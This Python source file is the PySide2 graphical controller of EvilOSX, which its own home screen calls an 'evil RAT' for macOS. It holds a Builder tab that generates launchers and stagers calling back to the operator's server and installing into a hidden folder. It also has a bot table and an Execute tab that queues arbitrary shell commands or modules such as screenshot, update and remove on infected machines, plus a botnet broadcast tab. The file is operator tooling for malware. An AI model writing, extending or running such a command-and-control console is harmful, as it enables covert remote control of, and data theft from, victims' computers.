# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from os import path
from time import strftime, localtime
from uuid import uuid4

from PySide2.QtCore import Qt
from PySide2.QtGui import QPalette, QColor, QPixmap
from PySide2.QtWidgets import QApplication, QMainWindow, QTabWidget, QTableWidget, QWidget, \
    QLabel, QHBoxLayout, QGridLayout, QSplitter, QAbstractItemView, QHeaderView, QTableWidgetItem, \
    QComboBox, QLineEdit, QPushButton, QVBoxLayout, QMessageBox, QTextEdit

from bot import launchers, loaders
from server import modules
from server.model import Command, CommandType
from server.modules.helper import ModuleViewABC
from server.version import VERSION
from server.view.helper import *


class _BuilderTab(QWidget):
    """Handles the creation of launchers."""

    def __init__(self):
        super(_BuilderTab, self).__init__()

        self._layout = QVBoxLayout()

        host_label = QLabel("Server host (where EvilOSX will connect to):")
        self._host_field = QLineEdit()

        self._layout.addWidget(host_label)
        self._layout.addWidget(self._host_field)

        port_label = QLabel("Server port:")
        self._port_field = QLineEdit()

        self._layout.addWidget(port_label)
        self._layout.addWidget(self._port_field)

        live_label = QLabel("Where should EvilOSX live? (Leave empty for ~/Library/Containers/.<RANDOM>): ")
        self._live_field = QLineEdit()

        self._layout.addWidget(live_label)
        self._layout.addWidget(self._live_field)

        launcher_label = QLabel("Launcher name:")
        self._launcher_combobox = QComboBox()

        for launcher_name in launchers.get_names():
            self._launcher_combobox.addItem(launcher_name)

        self._layout.addWidget(launcher_label)
        self._layout.addWidget(self._launcher_combobox)

        loader_label = QLabel("Loader name:")
        loader_combobox = QComboBox()
        self._loader_layout = QVBoxLayout()

        for loader_name in loaders.get_names():
            loader_combobox.addItem(loader_name)

        self._layout.addWidget(loader_label)
        self._layout.addWidget(loader_combobox)
        loader_combobox.currentTextChanged.connect(self._set_on_loader_change)

        # Dynamically loaded loader layout
        self._layout.addLayout(self._loader_layout)
        self._set_on_loader_change(loader_combobox.currentText())

        self._layout.setContentsMargins(10, 10, 10, 0)
        self._layout.setAlignment(Qt.AlignTop)
        self.setLayout(self._layout)

    def _set_on_loader_change(self, new_text):
        """Handles the loader combobox change event.

        :type new_text: str
        """
        while self._loader_layout.count():
            child = self._loader_layout.takeAt(0)

            if child.widget():
                child.widget().deleteLater()

        input_fields = []

        for message in loaders.get_option_messages(new_text):
            input_field = QLineEdit()

            self._loader_layout.addWidget(QLabel(message))
            self._loader_layout.addWidget(input_field)
            input_fields.append(input_field)

        create_button = QPushButton("Create launcher")
        create_button.setMaximumWidth(250)
        create_button.setMinimumHeight(30)
        create_button.pressed.connect(lambda: self._on_create_launcher(
            self._host_field.text(), self._port_field.text(), self._live_field.text(),
            new_text, self._launcher_combobox.currentText(), input_fields
        ))

        self._loader_layout.addWidget(QLabel(""))
        self._loader_layout.addWidget(create_button)

    @staticmethod
    def display_error(text):
        """Displays an error message to the user.

        :type text: str
        """
        message = QMessageBox()

        message.setIcon(QMessageBox.Critical)
        message.setWindowTitle("Error")
        message.setText(text)
        message.setStandardButtons(QMessageBox.Ok)
        message.exec_()

    @staticmethod
    def display_info(text):
        """
        :type text: str
        """
        message = QMessageBox()

        message.setIcon(QMessageBox.Information)
        message.setWindowTitle("Information")
        message.setText(text)
        message.setStandardButtons(QMessageBox.Ok)
        message.exec_()

    def _on_create_launcher(self, server_host, server_port, program_directory,
                            loader_name, launcher_name, input_fields):
        """Creates the launcher and outputs it to the builds directory.

        :type server_host: str
        :type server_port: int
        :type program_directory: str
        :type loader_name: str
        :type launcher_name: str
        :type input_fields: list
        """
        if not self._host_field.text():
            self.display_error("Invalid host specified.")
        elif not str(self._port_field.text()).isdigit():
            self.display_error("Invalid port specified.")
        else:
            set_options = []

            for field in input_fields:
                set_options.append(field.text())

            loader_options = loaders.get_options(loader_name, set_options)
            loader_options["program_directory"] = program_directory

            stager = launchers.create_stager(server_host, server_port, loader_options)

            launcher_extension, launcher = launchers.generate(launcher_name, stager)
            launcher_path = path.realpath(path.join(
                path.dirname(__file__), path.pardir, path.pardir, "data", "builds", "Launcher-{}.{}".format(
                    str(uuid4())[:6], launcher_extension
                )))

            with open(launcher_path, "w") as output_file:
                output_file.write(launcher)

            self.display_info("Launcher written to: \n{}".format(launcher_path))


class _BroadcastTab(QWidget):
    """Tab used to interact with the whole botnet at once."""

    def __init__(self, model):
        super(_BroadcastTab, self).__init__()

        self._model = model

        layout = QVBoxLayout()
        label = QLabel("This tab is not yet implemented.")

        label.setAlignment(Qt.AlignTop)
        layout.addWidget(label)

        self.setLayout(layout)


class _ResponsesTab(QTabWidget):
    """Tab which shows all module and shell responses."""

    def __init__(self):
        super(_ResponsesTab, self).__init__()

        layout = QVBoxLayout()
        self._output_field = QTextEdit()

        self._output_field.setTextInteractionFlags(Qt.NoTextInteraction)
        self._output_field.setPlaceholderText("Please wait for responses...")

        layout.addWidget(self._output_field)
        self.setLayout(layout)

    def clear(self):
        """Clears all output."""
        self._output_field.clear()

    def output(self, text):
        """Adds a line to the output field.

        :type text: str
        """
        self._output_field.append(text)


class ModuleView(ModuleViewABC):
    """Used by modules to interact with this GUI."""

    def __init__(self, responses_tab):
        """
        :type responses_tab: _ResponsesTab
        """
        self._responses_tab = responses_tab

    def display_error(self, text):
        """
        :type text: str
        """
        message_box = QMessageBox()

        message_box.setIcon(QMessageBox.Critical)
        message_box.setWindowTitle("Error")
        message_box.setText(text)
        message_box.setStandardButtons(QMessageBox.Ok)
        message_box.exec_()

    def display_info(self, text):
        """
        :type text: str
        """
        message_box = QMessageBox()

        message_box.setIcon(QMessageBox.Information)
        message_box.setWindowTitle("Information")
        message_box.setText(text)
        message_box.setStandardButtons(QMessageBox.Ok)
        message_box.exec_()

    def should_continue(self, messages):
        """
        :type messages: list[str]
        :rtype: bool
        """
        messages.append("\nAre you sure you want to continue?")

        confirm = QMessageBox.question(self._responses_tab, "Confirmation",
                                       "\n".join(messages), QMessageBox.Yes, QMessageBox.No)

        if confirm == QMessageBox.Yes:
            return True
        else:
            return False

    def output(self, line, prefix=""):
        """
        :type line: str
        :type prefix: str
        """
        self._responses_tab.output(line)


class _ExecuteTab(QTabWidget):
    """Tab used to execute modules or shell commands on the selected bot."""

    def __init__(self, responses_tab, model):
        """
        :type responses_tab: _ResponsesTab
        """
        super(_ExecuteTab, self).__init__()

        self._model = model
        self._current_layout = None
        self._current_bot = None

        self._layout = QGridLayout()
        self._sub_layout = QVBoxLayout()
        self._module_view = ModuleView(responses_tab)

        self._layout.setAlignment(Qt.AlignTop)
        self.setLayout(self._layout)
        self.set_empty_layout()

    def set_current_bot(self, bot):
        """Sets the connected bot this tab will interact with.

        :type bot: Bot
        """
        self._current_bot = bot

    def _clear_layout(self):
        while self._layout.count():
            child = self._layout.takeAt(0)

            if child.widget():
                child.widget().deleteLater()
        while self._sub_layout.count():
            child = self._sub_layout.takeAt(0)

            if child.widget():
                child.widget().deleteLater()

    def set_empty_layout(self):
        """Default layout shown when the user has not yet selected a row."""
        self._current_layout = "Empty"
        self._clear_layout()

        self._layout.addWidget(QLabel("Please select a bot in the table above."), 0, 0)

    def set_module_layout(self, module_name="screenshot"):
        """Sets the layout which can execute modules.

        :type module_name: str
        """
        self._current_layout = "Module"
        self._clear_layout()

        command_type_label = QLabel("Command type: ")
        command_type_combobox = QComboBox()

        command_type_combobox.addItem("Module")
        command_type_combobox.addItem("Shell")

        module_label = QLabel("Module name: ")
        module_combobox = QComboBox()

        for module_name in modules.get_names():
            module_combobox.addItem(module_name)

        module_combobox.currentTextChanged.connect(self._on_module_change)
        command_type_combobox.currentTextChanged.connect(self._on_command_type_change)

        self._layout.setColumnStretch(1, 1)
        self._layout.addWidget(command_type_label, 0, 0)
        self._layout.addWidget(command_type_combobox, 0, 1)
        self._layout.addWidget(module_label, 1, 0)
        self._layout.addWidget(module_combobox, 1, 1)

        # Module layout
        cached_module = modules.get_module(module_name)

        if not cached_module:
            cached_module = modules.load_module(module_name, self._module_view, self._model)

        input_fields = []

        for option_name in cached_module.get_setup_messages():
            input_field = QLineEdit()

            self._sub_layout.addWidget(QLabel(option_name))
            self._sub_layout.addWidget(input_field)
            input_fields.append(input_field)

        run_button = QPushButton("Run")
        run_button.setMaximumWidth(250)
        run_button.setMinimumHeight(25)

        run_button.pressed.connect(lambda: self._on_module_run(module_combobox.currentText(), input_fields))

        self._sub_layout.addWidget(QLabel(""))
        self._sub_layout.addWidget(run_button)
        self._sub_layout.setContentsMargins(0, 15, 0, 0)
        self._layout.addLayout(self._sub_layout, self._layout.rowCount() + 2, 0, 1, 2)

        self._on_module_change(module_combobox.currentText())

    def set_shell_layout(self):
        """Sets the layout which can execute shell commands."""
        self._current_layout = "Shell"
        self._clear_layout()

        command_type_label = QLabel("Command type: ")
        command_type_combobox = QComboBox()

        command_type_combobox.addItem("Shell")
        command_type_combobox.addItem("Module")

        command_label = QLabel("Command:")
        command_input = QLineEdit()

        run_button = QPushButton("Run")
        run_button.setMaximumWidth(250)
        run_button.setMinimumHeight(25)

        command_type_combobox.currentTextChanged.connect(self._on_command_type_change)
        run_button.pressed.connect(lambda: self._on_command_run(command_input))

        self._layout.addWidget(command_type_label, 0, 0)
        self._layout.addWidget(command_type_combobox, 0, 1)
        self._layout.addWidget(command_label, 1, 0)
        self._layout.addWidget(command_input, 1, 1)

        self._sub_layout.addWidget(QLabel(""))
        self._sub_layout.addWidget(run_button)
        self._sub_layout.setContentsMargins(0, 15, 0, 0)
        self._layout.addLayout(self._sub_layout, self._layout.rowCount() + 2, 0, 1, 2)

    def _on_command_type_change(self, text):
        """Handles the command type combobox change event.

        :type text: str
        """
        if text == "Module":
            self.set_module_layout()
        else:
            self.set_shell_layout()

    def _on_module_change(self, module_name):
        """Handles module combobox changes.

        :type module_name: str
        """
        while self._sub_layout.count():
            child = self._sub_layout.takeAt(0)

            if child.widget():
                child.widget().deleteLater()

        cached_module = modules.get_module(module_name)

        if not cached_module:
            cached_module = modules.load_module(module_name, self._module_view, self._model)

        input_fields = []

        for option_name in cached_module.get_setup_messages():
            input_field = QLineEdit()
            input_fields.append(input_field)

            self._sub_layout.addWidget(QLabel(option_name))
            self._sub_layout.addWidget(input_field)

        run_button = QPushButton("Run")
        run_button.setMaximumWidth(250)
        run_button.setMinimumHeight(25)

        run_button.pressed.connect(lambda: self._on_module_run(module_name, input_fields))

        self._sub_layout.addWidget(QLabel(""))
        self._sub_layout.addWidget(run_button)
        self._sub_layout.setContentsMargins(0, 15, 0, 0)

    def display_info(self, text):
        """
        :type text: str
        """
        message_box = QMessageBox()

        message_box.setIcon(QMessageBox.Information)
        message_box.setWindowTitle("Information")
        message_box.setText(text)
        message_box.setStandardButtons(QMessageBox.Ok)
        message_box.exec_()

    def _on_module_run(self, module_name, input_fields):
        """Handles running modules.

        :type module_name: str
        :type input_fields: list
        """
        set_options = []

        for input_field in input_fields:
            set_options.append(input_field.text())

        module = modules.get_module(module_name)

        if not module:
            module = modules.load_module(module_name, self._module_view, self._model)

        successful, options = module.setup(set_options)

        if successful:
            if module_name == "remove_bot":
                code = loaders.get_remove_code(self._current_bot.loader_name)
            elif module_name == "update_bot":
                code = loaders.get_update_code(self._current_bot.loader_name)
            else:
                code = modules.get_code(module_name)

            if not options:
                options = {}

            options["module_name"] = module_name

            self._model.add_command(self._current_bot.uid, Command(
                CommandType.MODULE, code, options
            ))

            self.display_info("Module added to the queue of:\n {}@{}".format(
                self._current_bot.username, self._current_bot.hostname)
            )

    def _on_command_run(self, command_input):
        """Handles running commands.

        :type command_input: QLineEdit
        """
        if command_input.text().strip() == "":
            return

        self._model.add_command(self._current_bot.uid, Command(CommandType.SHELL, command_input.text().encode()))

        command_input.clear()
        self.display_info("Command added to the queue of:\n {}@{}".format(
            self._current_bot.username, self._current_bot.hostname
        ))


class _BotTable(QTableWidget):
    """Table which holds all bots."""

    def __init__(self):
        super(_BotTable, self).__init__()

        self._header_labels = ["UID", "Username", "Version", "Last Seen"]

        self.setColumnCount(len(self._header_labels))
        self.setHorizontalHeaderLabels(self._header_labels)

        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.setAlternatingRowColors(True)
        self.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.setEditTriggers(QAbstractItemView.NoEditTriggers)

        for i in range(len(self._header_labels)):
            self.horizontalHeader().setSectionResizeMode(i, QHeaderView.Stretch)

    def set_on_selection_changed(self, callback_function):
        self.itemSelectionChanged.connect(callback_function)

    def add_bot(self, bot):
        """Adds a bot to the table.

        :rtype bot: Bot
        """
        self.setRowCount(self.rowCount() + 1)
        created_row = self.rowCount() - 1

        self.setItem(created_row, 0, QTableWidgetItem(bot.uid))
        self.setItem(created_row, 1, QTableWidgetItem(bot.username + "@" + bot.hostname))
        self.setItem(created_row, 2, QTableWidgetItem(bot.system_version))
        self.setItem(created_row, 3, QTableWidgetItem(
            strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
        ))

    def remove_bot(self, bot):
        """Removes a bot from the table.

        :rtype bot: Bot
        """
        pass


class _ControlTab(QWidget):
    """Tab which allows the user to control individual bots.

    Handles any events fired by the table etc.
    """

    def __init__(self, model):
        super(_ControlTab, self).__init__()

        self._model = model

        layout = QGridLayout()
        splitter = QSplitter()

        self._bot_table = _BotTable()
        self._responses_tab = _ResponsesTab()
        self._execute_tab = _ExecuteTab(self._responses_tab, model)

        self._tab_widget = QTabWidget()
        self._tab_widget.addTab(self._execute_tab, "Execute")
        self._tab_widget.addTab(self._responses_tab, "Responses")

        splitter.setOrientation(Qt.Vertical)
        splitter.addWidget(self._bot_table)
        splitter.addWidget(self._tab_widget)
        splitter.setSizes([50, 100])

        layout.addWidget(splitter)
        self.setLayout(layout)

        self._register_listeners()

    def _register_listeners(self):
        self._bot_table.set_on_selection_changed(self.on_table_selection_changed)

    def on_table_selection_changed(self):
        bot_uid = self._bot_table.item(self._bot_table.currentRow(), 0).text()

        self._execute_tab.set_current_bot(self._model.get_bot(bot_uid))
        self._execute_tab.set_module_layout()
        self._responses_tab.clear()

    def get_table(self):
        """
        :rtype: _BotTable
        """
        return self._bot_table

    def get_responses_tab(self):
        """
        :rtype: _ResponsesTab
        """
        return self._responses_tab


class _HomeTab(QWidget):
    """Home tab which contains information about EvilOSX."""

    def __init__(self):
        super(_HomeTab, self).__init__()

        self._layout = QHBoxLayout()
        self.setLayout(self._layout)

        message_label = QLabel("""\
        Welcome to <b>EvilOSX</b>:<br/>
        An evil RAT (Remote Administration Tool) for macOS / OS X.<br/><br/><br/>

        Author: Marten4n6<br/>
        License: GPLv3<br/>
        Version: <b>{}</b>
        """.format(VERSION))
        logo_label = QLabel()

        logo_path = path.join(path.dirname(__file__), path.pardir, path.pardir, "data", "images", "logo_334x600.png")
        logo_label.setPixmap(QPixmap(logo_path))

        self._layout.setAlignment(Qt.AlignCenter)
        self._layout.setSpacing(50)
        self._layout.addWidget(message_label)
        self._layout.addWidget(logo_label)


class _TabbedWidget(QTabWidget):
    """Widget which holds all tabs."""

    def __init__(self, model):
        super(_TabbedWidget, self).__init__()

        self._home_tab = _HomeTab()
        self._control_tab = _ControlTab(model)
        self._broadcast_tab = _BroadcastTab(model)
        self._builder_tab = _BuilderTab()

        self.addTab(self._home_tab, "Home")
        self.addTab(self._control_tab, "Control")
        self.addTab(self._broadcast_tab, "Broadcast")
        self.addTab(self._builder_tab, "Builder")

    def get_home_tab(self):
        """
        :rtype: _HomeTab
        """
        return self._home_tab

    def get_control_tab(self):
        """
        :rtype: _ControlTab
        """
        return self._control_tab

    def get_broadcast_tab(self):
        """
        :rtype: _BroadcastTab
        """
        return self._broadcast_tab

    def get_builder_tab(self):
        """
        :rtype: _BuilderTab
        """
        return self._builder_tab


class _MainWindow(QMainWindow):
    """Main GUI window which displays the tabbed widget."""

    def __init__(self, central_widget):
        """
        :type central_widget: QWidget
        """
        super(_MainWindow, self).__init__()

        self.setGeometry(0, 0, 1000, 680)
        self.setCentralWidget(central_widget)


class _QDarkPalette(QPalette):
    """Dark palette for a Qt application."""

    def __init__(self):
        super(_QDarkPalette, self).__init__()

        self._color_white = QColor(255, 255, 255)
        self._color_black = QColor(0, 0, 0)
        self._color_red = QColor(255, 0, 0)
        self._color_primary = QColor(53, 53, 53)
        self._color_secondary = QColor(35, 35, 35)
        self._color_tertiary = QColor(42, 130, 218)

        self.setColor(QPalette.Window, self._color_primary)
        self.setColor(QPalette.WindowText, self._color_white)
        self.setColor(QPalette.Base, self._color_secondary)
        self.setColor(QPalette.AlternateBase, self._color_primary)
        self.setColor(QPalette.ToolTipBase, self._color_white)
        self.setColor(QPalette.ToolTipText, self._color_white)
        self.setColor(QPalette.Text, self._color_white)
        self.setColor(QPalette.Button, self._color_primary)
        self.setColor(QPalette.ButtonText, self._color_white)
        self.setColor(QPalette.BrightText, self._color_red)
        self.setColor(QPalette.Link, self._color_tertiary)
        self.setColor(QPalette.Highlight, self._color_tertiary)
        self.setColor(QPalette.HighlightedText, self._color_black)

    def apply(self, application):
        """Apply this theme to the given application.

        :type application: QApplication
        """
        application.setStyle("Fusion")
        application.setPalette(self)
        application.setStyleSheet("QToolTip {{"
                                  "color: {white};"
                                  "background-color: {tertiary};"
                                  "border: 1px solid {white};"
                                  "}}".format(white="rgb({}, {}, {})".format(*self._color_white.getRgb()),
                                              tertiary="rgb({}, {}, {})".format(*self._color_tertiary.getRgb())))


class ViewGUI(ViewABC):
    """This class interacts with the user via a graphical user interface.

    Used by the controller to communicate with the view.
    """

    def __init__(self, model, server_port):
        """
        :type server_port: int
        """
        self._model = model
        self._server_port = server_port

        self._application = QApplication([])
        self._tabbed_widget = _TabbedWidget(model)
        self._main_window = _MainWindow(self._tabbed_widget)

        self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, str(server_port)))

        _QDarkPalette().apply(self._application)

    def get_tabbed_widget(self):
        """
        :rtype: QWidget
        """
        return self._tabbed_widget

    def output(self, line, prefix=""):
        """
        :rtype: line: str
        :rtype: prefix: str
        """
        self._tabbed_widget.get_control_tab().get_responses_tab().output(line)

    def on_response(self, response):
        """
        :type response: str
        """
        responses_tab = self._tabbed_widget.get_control_tab().get_responses_tab()

        self.output_separator()

        for line in response.splitlines():
            responses_tab.output(line)

    def on_bot_added(self, bot):
        """
        :rtype: Bot
        """
        self._tabbed_widget.get_control_tab().get_table().add_bot(bot)
        self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: {}".format(
            VERSION, str(self._server_port), self._model.get_bot_amount()
        ))

    def on_bot_removed(self, bot):
        """
        :type: Bot
        """
        bot_table = self._tabbed_widget.get_control_tab().get_table()

        bot_table.remove_bot(bot)

    def on_bot_path_change(self, bot):
        """
        :type bot: Bot
        """
        super(self).on_bot_path_change(bot)

    def start(self):
        self._main_window.show()
        self._application.exec_()
